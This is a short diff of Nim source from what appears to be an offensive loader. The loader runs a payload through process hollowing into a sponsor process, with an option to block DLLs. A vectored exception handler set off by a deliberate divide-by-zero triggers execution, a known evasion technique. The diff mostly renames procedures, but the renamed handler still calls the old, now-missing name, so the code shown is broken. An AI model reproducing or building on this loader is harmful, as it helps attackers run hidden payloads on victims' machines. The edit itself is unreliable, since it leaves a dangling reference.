@@ -79,7 +79,7 @@ proc execute(payload: string, sponsorCmd: string = getAppFilename(), isBlockDlls
         return hollow456Manager(peStr, ppi)
 
 
-proc wrap_execute() =
+proc wrapExecute() =
     discard execute(
         payload = payload, 
         sponsorCmd = sponsorPath & sponsorParams,
@@ -90,17 +90,19 @@ proc wrap_execute() =
     quit(0)
 
 
-proc wrap_execute_veh(pExceptInfo: PEXCEPTION_POINTERS): LONG =
+proc wrapExecuteVEH(pExceptInfo: PEXCEPTION_POINTERS): LONG =
     if (pExceptInfo.ExceptionRecord.ExceptionCode == cast[DWORD](0xC0000094)): # STATUS_INTEGER_DIVIDE_BY_ZERO 
         wrap_execute()
+    else:
+        return EXCEPTION_CONTINUE_SEARCH
 
 
 proc main*() =
     if isVeh:
-        AddVectoredExceptionHandler(1, cast[PVECTORED_EXCEPTION_HANDLER](wrap_execute_veh))
+        AddVectoredExceptionHandler(1, cast[PVECTORED_EXCEPTION_HANDLER](wrapExecuteVEH))
         raiseVEH()
     else:
-        wrap_execute()
+        wrapExecute()
 
 
 when isMainModule:
